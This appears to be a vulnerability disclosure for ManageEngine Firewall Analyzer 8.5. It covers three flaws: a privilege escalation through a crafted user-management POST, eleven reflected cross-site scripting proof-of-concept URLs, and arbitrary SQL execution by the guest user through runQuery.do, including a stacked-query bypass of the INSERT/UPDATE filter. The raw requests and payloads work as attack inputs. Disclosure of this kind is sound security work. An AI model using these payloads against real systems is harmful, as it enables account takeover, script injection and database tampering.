@@ -1,0 +1,153 @@
+================================================================
+ManageEngine Firewall Analyzer 8.5– Privilege Escalation Vulnerability
+================================================================
+
+Description :
+
+Vulnerability Type : Privilege Escalation Vulnerability
+Vulnerable Version : 8.5
+Vendor Homepage:https://www.manageengine.com/products/firewall/download.html
+CVE-ID :
+Severity : High
+Author – Sachin Wagh (@tiger_tigerboy)
+
+ManageEngine Firewall Analyzer is an agent less log analytics and
+configuration management software that helps network administrators to
+centrally collect,
+archive, analyze their security device logs and generate forensic reports
+out of it.
+
+It allows an attacker to gain admin privileges.
+
+Proof of Concept URL
+--------------------
+
+1. Setup Burp and change user password and change username to admin.
+
+2. Burp Request :
+
+POST /fw/userManagementForm.do HTTP/1.1
+Host: localhost:8500
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101
+Firefox/43.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost:8500/fw/index2.do?url=archivedFiles&helpP=archivedFiles&completeData=true&tab=system&subTab=cal&flushCache=true&DateRange=false&timeFrame=LastWeek
+Cookie: leftPanel=230px; JSESSIONID=E58D08B4F3AF70279BBB128D713EADB7;
+JSESSIONIDSSO=A326C72CC526B521A8EA9286C7951F0C; FWA_TABLE=TS
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 159
+
+password=guest&email=guest%40adventnet.com
+&addField=false&userName=guest&userID=2&changePassword=true&isDemo=false&domainName=&productName=firewall&next=logoff
+
+#########################################################
+
+================================================================
+ManageEngine Firewall Analyzer 8.5– Multiple Cross-Site Scripting
+Vulnerability
+================================================================
+
+Description :
+
+Vulnerability Type : Multiple Cross Site Scripting Vulnerability
+Vulnerable Version : 8.5
+Vendor Homepage:https://www.manageengine.com/products/firewall/download.html
+CVE-ID :
+Severity : High
+Author – Sachin Wagh (@tiger_tigerboy)
+
+
+ManageEngine Firewall Analyzer is an agent less log analytics and
+configuration management software that helps network administrators to
+centrally collect,
+archive, analyze their security device logs and generate forensic reports
+out of it.
+
+ManageEngine Firewall Analyzer is prone to multiple cross-site scripting
+vulnerabilities because it fails to sanitize user-supplied input. An
+attacker may leverage these issues to execute arbitrary script code
+in the browser of an unsuspecting user in the context of the affected site.
+
+Proof of Concept URL
+-----------------------------------------------------------------------------------------------------------------------------------
+
+1. http://localhost:8500/ResolveDNSConfig.nms?f4efe
+"><script>alert(1)</script>2b1254aa403=1
+2. http://localhost:8500/addDevCrd.nms?cba2d
+"><script>alert(1)</script>99328e18e3f=1
+3. http://localhost:8500/customizeReportAction.nms?flushAll=true&17eab
+"><script>alert(1)</script>d1bf001d67b=1
+4. http://localhost:8500/userIPConfig.nms?fe1b5
+"><script>alert(1)</script>62ff05628d3=1
+5. http://localhost:8500/viewListPageAction.nms?3078c
+"><script>alert(1)</script>fea0d816dfe=1
+6.
+http://localhost:8500/createAnomaly.nms?dc8c4%22%3E%3Cscript%3Ealert%281%29%3C/script%3E0c840168f94=1
+7. http://localhost:8500/createProfile.do?66342
+"><script>alert(1)</script>7cdd43cf7ed=1
+8.
+http://localhost:8500/fw/ResolveDNSConfig.nms?dnsOption=1&dnsMemorySize=10000&dnsUpdate=&dnsResult=&6adac%22%3E%3Cscript%3Ealert%281%29%3C/script%3E619a9b8bff2d28708=1
+9.
+http://localhost:8500/fw/index2.do?url=advSrchAction&tab=search&sMode=adv&subTab=advSrch&3602d%22%3E%3Cscript%3Ealert%281%29%3C/script%3E4bb604792b5eb3ace=1&DateRange=&flushCache=&additionalParams=sMode%3dadv%26subTab%3dadvSrch%26tab%3dsearch%26url%3dadvSrchAction&functionName=&to=2016-01-15+00%3a00+++2016-01-15+12%3a35&uniqueReport=null
+10.
+http://localhost:8500/searchAction.do?fd272%22%3E%3Cscript%3Ealert%281%29%3C/script%3Eace8dfca87a=1
+11.
+http://localhost:8500/uniquereport.do?baseUrl=uniquereport&resourceName=SimulatedFirewall1&displayName=SimulatedFirewall1&reportId=1&resourceType=Firewall&divid=Firewall_1&divType=block&applyTimeCriteria=true&7db2f%22%3E%3Cscript%3Ealert%281%29%3C/script%3E8d3926f45f8=1
+
+#########################################################
+
+================================================================
+ManageEngine Firewall Analyzer 8.5 SQL Query Execution Vulnerability
+================================================================
+
+Description :
+
+Vulnerability Type : ManageEngine Firewall Analyzer 8.5 SQL Query Execution Vulnerability
+Vulnerable Version : 8.5
+Vendor Homepage:https://www.manageengine.com/products/firewall/download.html
+CVE-ID :
+Severity : High
+Author – Sachin Wagh (@tiger_tigerboy)
+
+ManageEngine Firewall Analyzer is an agent less log analytics and configuration management software that helps network administrators to centrally collect,
+archive, analyze their security device logs and generate forensic reports out of it.
+
+The vulnerability exists due to an error in the RunQuerycommand.  An authenticated, remote attacker could exploit
+this vulnerability via a crafted POST request.  An exploit could allow the attacker to execute arbitrary SQL queries on the  underlying database server.
+
+Every user has the ability to execute SQL queries through the "/fw/runQuery.do" script, including the default "guest" user.
+
+Below is the POST request, executed as "guest":
+
+POST /fw/runQuery.do HTTP/1.1
+Host: localhost:8500
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8500/fw/runQuery.do
+Cookie: username=guest; password=8094789293; leftPanel=230px; JSESSIONID=3590F06EA06BBA9B0FC9A40405E1144F; JSESSIONIDSSO=96016151FC34CD1EA17192C6AF288A14; FWA_TABLE=TS
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 123
+
+execute=true&DatabaseType=postgres&query=select version()
+
+Access to queries starting with "INSERT" or "UPDATE" giving warning as "operation not permitted"
+
+But When executed query, like this:"SELECT 1;INSERT INTO ..." its not giving any warning.
+
+
+Affected Product:
+------------------------------------------------------------------------------------------------------------
+
+Vulnerable Product:
+                                [+]  ManageEngine Firewall Analyzer 8.5
+
+Credits & Authors
+-------------------------------------------------------------------------------------------------------------
+Sachin Wagh (@tiger_tigerboy)
